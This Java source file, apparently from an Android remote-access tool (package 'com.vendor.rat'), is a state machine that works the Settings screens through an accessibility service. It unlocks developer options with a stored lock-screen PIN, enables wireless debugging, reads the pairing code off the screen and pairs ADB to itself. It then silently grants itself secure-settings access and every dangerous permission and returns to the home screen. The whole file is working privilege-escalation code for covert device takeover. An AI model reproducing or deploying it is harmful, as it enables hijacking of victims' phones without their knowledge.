package com.vendor.rat.auto.engine.adb;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.adb.AdbConnectionManager;
import com.vendor.rat.adb.AdbShellExecutor;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.engine.OpenDevelopmentDelegate;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.util.GkdSelectorHelper;
import com.vendor.rat.service.EngineManager;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.SecureSettingsWriter;
import com.vendor.rat.credential.LockCredentialStore;
import com.vendor.rat.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;

/**
 * Wireless ADB self-pairing engine — 7-phase state machine.
 *
 * Navigates Settings UI via AccessibilityService to:
 * 1. Open Developer Options
 * 2. Enable wireless debugging (split-preference layout: main_layout vs switch_layout)
 * 3. Click "使用配对码配对设备"
 * 4. Read 6-digit pairing code + port from resource-id fields, then doPair()
 * 5. Auto-connect via mDNS
 * 6. Bootstrap permissions (WRITE_SECURE_SETTINGS, enableWifiDebug, grantAll)
 *
 * Target device: OPPO PGFM10 (Android 16, ColorOS)
 *
 * Calibrated from real device XML dumps (2026-03-27):
 *   - Split-preference layout: main_layout enters sub-page, switch_layout toggles
 *   - Pair code dialog uses resource-id selectors (pairing_code, ip_addr)
 *   - Pair dialog has only Cancel button (no confirm), pairing is external
 *   - Toggle widget is android.widget.Switch
 *   - Pair dialog rendered by com.android.settings (not systemui)
 */
public class WirelessPairEngine extends AutoEngine {

    private static final String TAG = "WirelessPairEngine";

    /** Concurrency guard — only one pairing flow at a time */
    private static final AtomicBoolean mPairingInProgress = new AtomicBoolean(false);

    /** 6-digit code pattern */
    private static final Pattern CODE_PATTERN = Pattern.compile("\\d{6}");

    /** IP:port pattern for pairing endpoint */
    private static final Pattern IP_PORT_PATTERN = Pattern.compile(
            "(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}):(\\d{4,5})");

    // ============ State machine ============

    enum PairState {
        IDLE, ENABLE_DEV_MODE, NAVIGATE_DEV_OPTIONS, ENABLE_WIRELESS_DEBUG,
        CLICK_PAIR_CODE, READ_AND_PAIR, AUTO_CONNECT, BOOTSTRAP_PERMISSIONS,
        DONE, DONE_PARTIAL, FAILED
    }

    private volatile PairState state = PairState.IDLE;
    private volatile long phaseStartTime;
    private volatile long overallStartTime;
    private volatile int scrollAttempts = 0;

    // ============ Constructor ============

    public WirelessPairEngine() {
        super(buildMatchers(), WirelessPairConstants.PKG_SETTINGS);
    }

    private static List<WindowMatcher> buildMatchers() {
        List<WindowMatcher> list = new ArrayList<>();
        // Settings app: window state + content changes
        // Pair code dialog is also rendered by com.android.settings (confirmed from XML dumps)
        list.add(new WindowMatcher(WirelessPairConstants.PKG_SETTINGS)
                .addEventType(32).addEventType(2048));
        return list;
    }

    // ============ Static entry point ============

    /**
     * Check if a pairing flow is currently in progress.
     * Used by heartbeat trigger to avoid duplicate launches.
     */
    public static boolean isPairingInProgress() {
        return mPairingInProgress.get();
    }

    /**
     * Start the wireless pairing flow. Thread-safe, only one instance at a time.
     *
     * @param context Application or service context
     * @return true if pairing started, false if already in progress or service unavailable
     */
    public static boolean startPairing(Context context) {
        if (context == null) {
     Log.w(TAG, "startPairing: context is null");
     return false;
     }
     if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
  Log.w(TAG, "startPairing: OPPO credential gate not verified");
     return false;
        }
        if (!mPairingInProgress.compareAndSet(false, true)) {
            Log.w(TAG, "startPairing: already in progress");
            return false;
        }

        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service == null) {
            Log.e(TAG, "startPairing: AccessibilityService not running");
            mPairingInProgress.set(false);
            return false;
        }

        EngineManager mgr = service.getEngineManager();
        if (mgr == null) {
            Log.e(TAG, "startPairing: EngineManager not available");
            mPairingInProgress.set(false);
            return false;
        }

        WirelessPairEngine engine = new WirelessPairEngine();
        mgr.register(engine);
        engine.start();
        Log.i(TAG, "Wireless pairing engine started");
        return true;
    }

    // ============ Lifecycle ============

    @Override
    public void execute() {
        overallStartTime = System.currentTimeMillis();
        transitionTo(PairState.ENABLE_DEV_MODE);
    }

    @Override
    public void finish() {
        mPairingInProgress.set(false);
        // Unregister self from EngineManager
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null && service.getEngineManager() != null) {
            service.getEngineManager().unregister(this);
        }
        Log.i(TAG, "Engine finished in state: " + state);
        super.finish();
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                 AccessibilityEvent event) {
        // Handled by onEventSafe
    }

    @Override
    protected void onEventSafe(AccessibilityEvent event, String packageName,
                                String className) {
        if (checkOverallTimeout()) return;
        if (checkPhaseTimeout()) return;

        switch (state) {
            case NAVIGATE_DEV_OPTIONS:
                dispatchState("NAV_DEV", this::handleNavigateDevOptions,
                        "ENABLE_WIRELESS", "CLICK_PAIR", "READ_PAIR");
                break;
            case ENABLE_WIRELESS_DEBUG:
                dispatchState("ENABLE_WIRELESS", this::handleEnableWirelessDebug,
                        "NAV_DEV", "CLICK_PAIR", "READ_PAIR");
                break;
            case CLICK_PAIR_CODE:
                dispatchState("CLICK_PAIR", this::handleClickPairCode,
                        "ENABLE_WIRELESS", "READ_PAIR");
                break;
            case READ_AND_PAIR:
                dispatchState("READ_PAIR", this::handleReadAndPair,
                        "CLICK_PAIR");
                break;
            default:
                // IDLE, AUTO_CONNECT, BOOTSTRAP_PERMISSIONS, DONE states
                // are handled by scheduler, not by events
                break;
        }
    }

    // ============ State transitions ============

    private void transitionTo(PairState newState) {
        PairState old = state;
        state = newState;
        phaseStartTime = System.currentTimeMillis();
        scrollAttempts = 0;
        log("State: " + old + " → " + newState);

        switch (newState) {
            case ENABLE_DEV_MODE:
                handleEnableDevMode();
                break;
            case NAVIGATE_DEV_OPTIONS:
                launchDevOptions();
                break;
            case AUTO_CONNECT:
                scheduler.execute(this::handleAutoConnect);
                break;
            case BOOTSTRAP_PERMISSIONS:
                scheduler.execute(this::handleBootstrapPermissions);
                break;
            case DONE:
            case DONE_PARTIAL:
                log("Pairing completed: " + newState);
                finish();
                break;
            case FAILED:
                logError("Pairing failed");
                finish();
                break;
            default:
                // Event-driven states (ENABLE_WIRELESS_DEBUG, CLICK_PAIR_CODE, READ_AND_PAIR)
                // will be handled via onEventSafe
                break;
        }
    }

    // ============ Phase 0: Enable Dev Mode ============

    private void handleEnableDevMode() {
        log("Phase 0: 检查开发者选项状态");

        // Check if already enabled (read-only — uses Settings.Global.getInt, no permission needed)
        if (SecureSettingsWriter.isDeveloperOptionsEnabled(getContext())) {
            log("Phase 0: 开发者选项已启用，跳过");
            transitionTo(PairState.NAVIGATE_DEV_OPTIONS);
            return;
        }

        // Fast fail: dev options disabled and no stored PIN — cannot auto-unlock
        if (!LockCredentialStore.hasCredential()) {
            logError("Phase 0: dev options disabled and no stored PIN, fast fail");
       transitionTo(PairState.FAILED);
            return;
        }

        log("Phase 0: 开发者选项未启用，启动 OpenDevelopmentDelegate");

        // Launch Settings > About Phone so OpenDevelopmentDelegate can tap the build number
        try {
            Intent intent = new Intent(android.provider.Settings.ACTION_DEVICE_INFO_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            getContext().startActivity(intent);
        } catch (Exception e) {
            // Fallback: open main settings
            try {
                Intent intent = new Intent(android.provider.Settings.ACTION_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                getContext().startActivity(intent);
            } catch (Exception e2) {
                logError("Phase 0: 无法启动设置页面", e2);
            }
        }

        // Register OpenDevelopmentDelegate to handle the UI automation
        try {
            MyAccessibilityService svc = MyAccessibilityService.getInstance();
            if (svc != null) {
                EngineManager mgr = svc.getEngineManager();
                if (mgr != null && !mgr.hasEngine(OpenDevelopmentDelegate.class)) {
                    OpenDevelopmentDelegate delegate = new OpenDevelopmentDelegate();
                    mgr.register(delegate);
                    log("Phase 0: OpenDevelopmentDelegate 已注册");
                }
            }
        } catch (Exception e) {
            logError("Phase 0: 注册 OpenDevelopmentDelegate 失败", e);
        }

        // Poll for developer options becoming enabled (every 5s, up to 120s = 24 attempts)
        scheduler.schedule(() -> pollDevOptionsEnabled(0), 5, TimeUnit.SECONDS);
    }

    /**
     * Poll whether developer options have been enabled by OpenDevelopmentDelegate.
     * Checks every 5s, up to 24 attempts (120s total — matches OpenDevelopmentDelegate's 100s timeout).
     */
    private void pollDevOptionsEnabled(int attempt) {
        // Guard: if state changed externally (e.g., overall timeout), stop polling
        if (state != PairState.ENABLE_DEV_MODE) return;

        if (SecureSettingsWriter.isDeveloperOptionsEnabled(getContext())) {
            log("Phase 0: 开发者选项已成功启用!");
            transitionTo(PairState.NAVIGATE_DEV_OPTIONS);
            return;
        }

        if (attempt >= 24) { // 24 * 5s = 120s
            logError("Phase 0: 开发者选项启用超时");
            transitionTo(PairState.FAILED);
            return;
        }

        log("Phase 0: 等待开发者选项启用... (attempt " + (attempt + 1) + "/24)");
        scheduler.schedule(() -> pollDevOptionsEnabled(attempt + 1), 5, TimeUnit.SECONDS);
    }

    // ============ Phase 1: Navigate to Dev Options ============

    private void launchDevOptions() {
        scheduler.execute(() -> {
            try {
                Context ctx = getContext();
                if (ctx == null) {
                    logError("Phase 1: No context");
                    transitionTo(PairState.FAILED);
                    return;
                }
                Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                ctx.startActivity(intent);
                log("Phase 1: Launched developer options");
                sleep(1500);
                transitionTo(PairState.ENABLE_WIRELESS_DEBUG);
            } catch (Exception e) {
                logError("Phase 1: Launch failed", e);
                transitionTo(PairState.FAILED);
            }
        });
    }

    private void handleNavigateDevOptions() {
        // Verify we're on the dev options page
        sleep(500);
        activateRoot();
        UiNode root = k();
        if (root == null) {
            log("Phase 1: No root node, waiting...");
            return;
        }

        // Check for developer options indicators
        UiNode devTitle = GkdSelectorHelper.findOne(root,
                "TextView[text*=\"" + WirelessPairConstants.TEXT_DEVELOPER_OPTIONS + "\"]");
        if (devTitle != null) {
            log("Phase 1: Developer options page confirmed");
            transitionTo(PairState.ENABLE_WIRELESS_DEBUG);
        }
    }

    // ============ Phase 2: Enable Wireless Debug ============

    /**
     * OPPO ColorOS uses a split-preference layout for "无线调试":
     *
     *   LinearLayout[clickable=true]             ← outer row
     *     ├── main_layout[clickable=true]        ← click → enters wireless debug sub-page
     *     │     └── RelativeLayout
     *     │           └── TextView[text="无线调试"]
     *     └── switch_layout[clickable=true]      ← click → toggles the Switch on/off
     *           └── Switch[id="switch_widget"]
     *
     * Strategy:
     *   1. Find the Switch widget to check if wireless debug is already ON
     *   2. If ON:  click main_layout to enter the wireless debug sub-page
     *   3. If OFF: click switch_layout to toggle ON, handle confirm dialog, then click main_layout
     */
    private void handleEnableWirelessDebug() {
        if (SecureSettingsWriter.isWifiDebugEnabled(getContext())) {
            log("Phase 2: 无线调试已通过 API 检测开启，跳过 toggle，进入子页面");
         enterWirelessDebugSubPage();
      return;
  }
        sleep(500);
        activateRoot();
        UiNode root = k();
        if (root == null) {
            log("Phase 2: No root node");
            return;
        }

        // Search for "无线调试" text to confirm the row is visible
        UiNode wirelessText = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_WIRELESS_DEBUG_ROW);

        if (wirelessText == null) {
            // Try scrolling to find it
            if (scrollAttempts < WirelessPairConstants.MAX_SCROLL_ATTEMPTS) {
                UiNode scrollView = getScrollableNode();
                if (scrollView != null) {
                    scrollView.scrollForward();
                    scrollAttempts++;
                    log("Phase 2: Scrolling to find wireless debug (" + scrollAttempts + ")");
                    sleep(500);
                }
            } else {
                logError("Phase 2: Cannot find wireless debug after "
                        + WirelessPairConstants.MAX_SCROLL_ATTEMPTS + " scrolls");
                transitionTo(PairState.FAILED);
            }
            return;
        }

        // Find the Switch widget (android.widget.Switch) to check toggle state
        UiNode switchNode = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_SWITCH);
        boolean isToggleOn = switchNode != null && switchNode.isChecked();

        // Find main_layout (click to enter sub-page) by resource-id
        UiNode mainLayout = GkdSelectorHelper.findOne(root,
                "[id=\"" + WirelessPairConstants.RES_ID_MAIN_LAYOUT + "\"]");

        // Find switch_layout (click to toggle) by resource-id
        UiNode switchLayout = GkdSelectorHelper.findOne(root,
                "[id=\"" + WirelessPairConstants.RES_ID_SWITCH_LAYOUT + "\"]");

        if (isToggleOn) {
            // Already enabled — click main_layout to enter wireless debug sub-page
            log("Phase 2: Wireless debug already ON, entering sub-page");
            if (mainLayout != null) {
                mainLayout.click();
            } else {
                // Fallback: click the text row itself
                wirelessText.click();
            }
            sleep(1000);
            transitionTo(PairState.CLICK_PAIR_CODE);
            return;
        }

        // Toggle is OFF — click switch_layout to turn it on
        log("Phase 2: Wireless debug OFF, clicking switch_layout to enable");
        if (switchLayout != null) {
            switchLayout.click();
        } else if (switchNode != null) {
            // Fallback: click the Switch widget directly
            switchNode.click();
        } else {
            logError("Phase 2: Cannot find switch_layout or Switch widget");
            transitionTo(PairState.FAILED);
            return;
        }
        sleep(1000);

        // After toggling, a confirm dialog may appear
        handleConfirmDialog();
    }

    /**
     * Handle the wireless debugging confirmation dialog.
     * Three possible button variants: 确认, 允许, 确定
     */
    private void handleConfirmDialog() {
        activateRoot();
        UiNode root = k();
        if (root == null) return;

        // Try each confirm button variant
        String[] confirmSelectors = {
                WirelessPairConstants.SEL_CONFIRM_BUTTON_ID,
                WirelessPairConstants.SEL_CONFIRM_BUTTON_TEXT,
                WirelessPairConstants.SEL_ALLOW_BUTTON_TEXT,
                WirelessPairConstants.SEL_OK_BUTTON_TEXT,
        };

        for (String selector : confirmSelectors) {
            UiNode btn = GkdSelectorHelper.findOne(root, selector);
            if (btn != null) {
                log("Phase 2: Found confirm button: " + selector);
                btn.click();
                sleep(1000);
                // After confirming, the Switch should now be ON
                // Need to enter the sub-page via main_layout
                enterWirelessDebugSubPage();
                return;
            }
        }

        // No dialog found — toggle may have worked directly (no confirmation needed)
        // Check if Switch is now ON
        UiNode switchNode = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_SWITCH);
        if (switchNode != null && switchNode.isChecked()) {
            log("Phase 2: Switch toggled ON (no confirm dialog)");
            enterWirelessDebugSubPage();
            return;
        }

        // Check if we somehow landed on the wireless debug sub-page already
        UiNode pairOption = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_PAIR_WITH_CODE);
        if (pairOption != null) {
            log("Phase 2: Already on wireless debug page");
            transitionTo(PairState.CLICK_PAIR_CODE);
            return;
        }

        log("Phase 2: No confirm dialog found yet, waiting for event...");
    }

    /**
     * After enabling wireless debug toggle, enter the sub-page via main_layout.
     */
    private void enterWirelessDebugSubPage() {
        activateRoot();
        UiNode root = k();
        if (root == null) {
            transitionTo(PairState.CLICK_PAIR_CODE);
            return;
        }

        UiNode mainLayout = GkdSelectorHelper.findOne(root,
                "[id=\"" + WirelessPairConstants.RES_ID_MAIN_LAYOUT + "\"]");
        if (mainLayout != null) {
            log("Phase 2: Clicking main_layout to enter wireless debug sub-page");
            mainLayout.click();
        } else {
            // Fallback: click the row containing "无线调试"
            UiNode wirelessRow = GkdSelectorHelper.findOne(root,
                    WirelessPairConstants.SEL_WIRELESS_DEBUG_ROW);
            if (wirelessRow != null) {
                log("Phase 2: Clicking wireless debug text row (fallback)");
                wirelessRow.click();
            }
        }
        sleep(1000);
        transitionTo(PairState.CLICK_PAIR_CODE);
    }

    // ============ Phase 3: Click Pair Code ============

    private void handleClickPairCode() {
        sleep(500);
        activateRoot();
        UiNode root = k();
        if (root == null) {
            log("Phase 3: No root node");
            return;
        }

        UiNode pairOption = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_PAIR_WITH_CODE);

        if (pairOption == null) {
            // Scroll to find it
            if (scrollAttempts < WirelessPairConstants.MAX_SCROLL_ATTEMPTS) {
                UiNode scrollView = getScrollableNode();
                if (scrollView != null) {
                    scrollView.scrollForward();
                    scrollAttempts++;
                    log("Phase 3: Scrolling to find pair code option (" + scrollAttempts + ")");
                    sleep(500);
                }
            } else {
                logError("Phase 3: Cannot find pair code option");
                transitionTo(PairState.FAILED);
            }
            return;
        }

        log("Phase 3: Found 'pair with code' option, clicking");
        pairOption.click();
        sleep(1500);
        transitionTo(PairState.READ_AND_PAIR);
    }

    // ============ Phase 4: Read Code + Pair ============

    /**
     * Read pairing code and port from the dialog using resource-id selectors.
     *
     * Dialog structure (from XML dump):
     *   AlertDialog[title="与设备配对"]
     *     ├── TextView[id="pairing_code", text="123671"]   ← 6-digit code
     *     ├── TextView[id="ip_addr", text="192.168.31.249:46549"]  ← IP:port
     *     └── Button[id="button2", text="取消"]            ← only Cancel, no confirm
     *
     * Strategy: Use resource-id selectors (most reliable), regex fallback.
     */
    private void handleReadAndPair() {
        sleep(500);
        activateRoot();
        UiNode root = k();
        if (root == null) {
            log("Phase 4: No root node");
            return;
        }

        // 1. Find pair code by resource-id (primary) or regex fallback
        String pairCode = null;
        UiNode codeNode = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_PAIRING_CODE);
        if (codeNode != null) {
            String text = codeNode.getText();
            if (text != null && CODE_PATTERN.matcher(text.trim()).matches()) {
                pairCode = text.trim();
                log("Phase 4: Found pair code via resource-id: " + pairCode);
            }
        }

        // Fallback: scan all TextViews for 6-digit code
        if (pairCode == null) {
            List<UiNode> textNodes = GkdSelectorHelper.findAll(root, "TextView");
            if (textNodes != null) {
                for (UiNode node : textNodes) {
                    String text = node.getText();
                    if (text != null && CODE_PATTERN.matcher(text.trim()).matches()) {
                        pairCode = text.trim();
                        log("Phase 4: Found pair code via regex fallback: " + pairCode);
                        break;
                    }
                }
            }
        }

        if (pairCode == null) {
            log("Phase 4: Pair code not found yet, waiting...");
            return;
        }

        // 2. Find IP:port by resource-id (primary) or regex fallback
        int pairPort = -1;
        UiNode ipNode = GkdSelectorHelper.findOne(root,
                WirelessPairConstants.SEL_IP_ADDR);
        if (ipNode != null) {
            String text = ipNode.getText();
            if (text != null) {
                pairPort = extractPort(text);
                if (pairPort > 0) {
                    log("Phase 4: Found pair port via resource-id: " + pairPort);
                }
            }
        }

        // Fallback: scan all TextViews for IP:port pattern
        if (pairPort < 0) {
            List<UiNode> textNodes = GkdSelectorHelper.findAll(root, "TextView");
            if (textNodes != null) {
                for (UiNode node : textNodes) {
                    String text = node.getText();
                    if (text == null) continue;
                    int port = extractPort(text);
                    if (port > 0) {
                        pairPort = port;
                        log("Phase 4: Found pair port via regex fallback: " + pairPort);
                        break;
                    }
                }
            }
        }

        if (pairPort < 0) {
            log("Phase 4: Pair port not found yet, waiting...");
            return;
        }

        // 3. Execute pairing on scheduler thread (network op — MUST NOT block event thread)
        final String code = pairCode;
        final int port = pairPort;
        // Prevent re-entry while pairing is in progress
        state = PairState.IDLE;
        scheduler.execute(() -> {
            log("Phase 4: Calling doPair(127.0.0.1, " + port + ", " + code + ")");
            AdbConnectionManager mgr = AdbConnectionManager.getInstance();
            if (mgr == null) {
                logError("Phase 4: AdbConnectionManager not initialized");
                transitionTo(PairState.FAILED);
                return;
            }
            boolean paired = mgr.doPair("127.0.0.1", port, code);
            if (paired) {
                log("Phase 4: Pairing succeeded!");
                // Dismiss the pair dialog (only has Cancel button)
                performBack();
                sleep(500);
                transitionTo(PairState.AUTO_CONNECT);
            } else {
                logError("Phase 4: Pairing failed");
                transitionTo(PairState.FAILED);
            }
        });
    }

    /**
     * Extract port number from an "IP:port" string.
     * Validates port is within the wireless pairing range.
     *
     * @return port number, or -1 if not found/invalid
     */
    private static int extractPort(String text) {
        java.util.regex.Matcher m = IP_PORT_PATTERN.matcher(text);
        if (m.find()) {
            try {
                int port = Integer.parseInt(m.group(2));
                if (port >= WirelessPairConstants.PAIR_PORT_MIN
                        && port <= WirelessPairConstants.PAIR_PORT_MAX) {
                    return port;
                }
            } catch (NumberFormatException ignored) {
            }
        }
        return -1;
    }

    // ============ Phase 5: Auto Connect ============

    private void handleAutoConnect() {
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null) {
            logError("Phase 5: AdbConnectionManager not initialized");
            transitionTo(PairState.FAILED);
            return;
        }

        for (int i = 0; i < WirelessPairConstants.AUTO_CONNECT_MAX_RETRIES; i++) {
            log("Phase 5: Auto-connect attempt " + (i + 1));
            boolean connected = mgr.doAutoConnect();
            if (connected) {
                log("Phase 5: Auto-connect succeeded!");
                transitionTo(PairState.BOOTSTRAP_PERMISSIONS);
                return;
            }
            sleep(WirelessPairConstants.AUTO_CONNECT_RETRY_DELAY_MS);
        }

        logError("Phase 5: Auto-connect failed after "
                + WirelessPairConstants.AUTO_CONNECT_MAX_RETRIES + " retries");
        transitionTo(PairState.FAILED);
    }

    // ============ Phase 6: Bootstrap Permissions ============

    private void handleBootstrapPermissions() {
        log("Phase 6: Bootstrapping permissions");

        Context ctx = getContext();
        String pkgName = ctx != null ? ctx.getPackageName() : "com.vendor.rat";

        // 1. Grant WRITE_SECURE_SETTINGS
        boolean secureGranted = AdbShellExecutor.grantWriteSecureSettings(pkgName);
        log("Phase 6: WRITE_SECURE_SETTINGS granted=" + secureGranted);

        // 2. Enable wireless debug via settings API (persists across reboot)
        if (secureGranted && ctx != null) {
            SecureSettingsWriter.enableDeveloperOptions(ctx);
            SecureSettingsWriter.enableWifiDebug(ctx);
            log("Phase 6: Wireless debug enabled via SecureSettingsWriter");
        }

        // 3. Grant all dangerous permissions
        int granted = AdbShellExecutor.grantAllPermissions(pkgName);
        log("Phase 6: Granted " + granted + " dangerous permissions");

        // Navigate away from settings
        performBack();
        sleep(300);
        performBack();
        sleep(300);
        performHome();

        if (secureGranted) {
            transitionTo(PairState.DONE);
        } else {
            log("Phase 6: WRITE_SECURE_SETTINGS failed, partial success");
            transitionTo(PairState.DONE_PARTIAL);
        }
    }

    // ============ Timeout checks ============

    private boolean checkPhaseTimeout() {
        if (state == PairState.IDLE || state == PairState.DONE
                || state == PairState.DONE_PARTIAL || state == PairState.FAILED
                || state == PairState.ENABLE_DEV_MODE) {
            // Phase 0 (ENABLE_DEV_MODE) has its own polling timeout — skip generic check
            return false;
        }
        long elapsed = System.currentTimeMillis() - phaseStartTime;
        if (elapsed > WirelessPairConstants.PHASE_TIMEOUT_MS) {
            logError("Phase timeout: " + state + " after " + elapsed + "ms");
            transitionTo(PairState.FAILED);
            return true;
        }
        return false;
    }

    private boolean checkOverallTimeout() {
        long elapsed = System.currentTimeMillis() - overallStartTime;
        if (elapsed > WirelessPairConstants.OVERALL_TIMEOUT_MS) {
            logError("Overall timeout after " + elapsed + "ms");
            transitionTo(PairState.FAILED);
            return true;
        }
        return false;
    }

    // ============ Equals / HashCode ============

    @Override
    public boolean equals(Object obj) {
        return obj instanceof WirelessPairEngine;
    }

    @Override
    public int hashCode() {
        return WirelessPairEngine.class.getName().hashCode();
    }
}
